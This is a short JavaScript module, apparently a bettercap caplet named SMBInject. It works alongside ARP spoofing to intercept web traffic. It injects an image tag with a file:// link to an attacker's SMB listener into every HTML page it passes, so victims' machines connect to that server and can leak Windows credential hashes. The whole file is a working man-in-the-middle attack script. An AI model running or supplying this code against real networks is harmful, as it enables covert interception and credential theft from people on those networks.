function onLoad() {
    log( "SMBInject loaded." );
    log("targets: " + env('arp.spoof.targets'));
    log("SMB Server Listener: " + env('smb.listener.ip'));
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<img src="file://' + env('smb.listener.ip') + '/smb.jpg"/></head>' 
            ); 
        }
    }
}
